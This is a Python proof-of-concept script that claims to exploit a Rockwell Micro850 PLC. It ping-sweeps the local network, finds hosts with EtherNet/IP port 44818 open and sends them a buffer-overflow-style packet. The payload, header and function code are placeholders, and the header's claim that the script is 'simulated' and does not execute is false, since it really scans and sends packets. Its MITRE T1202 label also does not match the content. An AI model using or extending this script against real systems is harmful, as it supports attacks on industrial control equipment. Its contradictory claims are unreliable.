# Proof-of-Concept: PLC Exploitation for Evasion (MITRE T1202)
# Targeting Rockwell Micro850 (Simulated - Does NOT execute actual exploitation)
# THIS SCRIPT IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.  DO NOT USE
# IT IN A PRODUCTION ENVIRONMENT WITHOUT PROPER AUTHORIZATION.  EXPLOITING
# VULNERABILITIES WITHOUT PERMISSION IS ILLEGAL AND UNETHICAL.

import socket
import struct
import time
import subprocess  # Required for IP address discovery

# Configuration (Modify as needed)
PLC_IP = None  # Initially unknown
PLC_PORT = 44818  # Standard EtherNet/IP port
VULNERABLE_FUNCTION_CODE = 0x42  # Placeholder - Replace with actual function code
EXPLOIT_PAYLOAD = b"\x41" * 200  # Example buffer overflow payload (modify appropriately)


def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the network
    using a ping sweep.  This is a rudimentary method and may not work in
    all network configurations.  More robust methods would involve network
    discovery tools or consulting network documentation.  Consider using nmap.
    """
    try:
        # Get the local network prefix (e.g., 192.168.1)
        ip_address = socket.gethostbyname(socket.gethostname())
        prefix = ".".join(ip_address.split(".")[:-1]) + "."
        print(f"Scanning network {prefix}.* for PLC...")

        for i in range(1, 255):
            target_ip = prefix + str(i)
            try:
                # Use ping to check if the device is alive
                result = subprocess.run(["ping", "-n", "1", "-w", "500", target_ip], capture_output=True, text=True)  # Adjust parameters as needed
                if "Reply from" in result.stdout:
                    #Attempt to probe for an open Ethernet/IP port
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    try:
                        sock.connect((target_ip, PLC_PORT))
                        print(f"Found potential PLC at IP address: {target_ip}!")
                        return target_ip
                    except socket.error:
                        pass  #No EIP service here
                    finally:
                        sock.close()

            except subprocess.CalledProcessError:
                pass  # Ping failed

        print("PLC IP address not found using ping sweep.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None



def craft_exploit_packet(function_code, payload):
    """
    Crafts a malicious packet designed to exploit a hypothetical vulnerability.
    Replace with actual packet structure and exploit details.  This example
    simulates a buffer overflow.

    Args:
        function_code (int): The function code to target.
        payload (bytes): The exploit payload.

    Returns:
        bytes: The crafted exploit packet.
    """

    # Example:  Craft a simple packet with a header, function code, and payload
    header = b"\xDE\xAD\xBE\xEF"  # Example header
    function_code_bytes = struct.pack("<B", function_code)  # Pack function code as a byte
    packet = header + function_code_bytes + payload
    return packet


def send_exploit(plc_ip, plc_port, exploit_packet):
    """
    Sends the crafted exploit packet to the PLC.

    Args:
        plc_ip (str): The PLC's IP address.
        plc_port (int): The PLC's port.
        exploit_packet (bytes): The crafted exploit packet.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Adjust timeout as needed
        sock.connect((plc_ip, plc_port))
        print(f"Connected to PLC at {plc_ip}:{plc_port}")
        sock.sendall(exploit_packet)
        print("Exploit packet sent.")

        # Optionally, attempt to receive a response from the PLC
        try:
            response = sock.recv(1024)  # Adjust buffer size as needed
            print(f"Received response: {response}") #It may not give a response at all, or corrupt the transmission
        except socket.timeout:
            print("No response received from PLC.")


    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        sock.close()
        print("Connection closed.")



if __name__ == "__main__":

    # 1. Discover PLC IP Address (if not already known)
    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            print("Could not discover PLC IP address. Exiting.")
            exit(1)
    print(f"PLC IP Address: {PLC_IP}")



    # 2. Craft the Exploit Packet
    exploit_packet = craft_exploit_packet(VULNERABLE_FUNCTION_CODE, EXPLOIT_PAYLOAD)


    # 3. Send the Exploit
    print("Sending exploit...")
    send_exploit(PLC_IP, PLC_PORT, exploit_packet)

    print("Exploit attempt complete.")